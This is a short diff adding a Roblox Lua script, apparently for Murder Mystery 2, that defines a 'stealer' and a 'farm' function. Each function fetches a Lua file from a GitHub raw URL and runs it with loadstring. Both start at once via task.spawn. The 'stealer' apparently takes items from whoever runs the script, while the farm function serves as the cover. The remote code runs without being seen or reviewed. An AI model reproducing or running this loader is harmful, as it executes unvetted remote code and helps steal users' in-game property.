@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Johnnyissocoollol/mm2stea/refs/heads/main/stealmore.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Johnnyissocoollol/mm2/refs/heads/main/dady.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
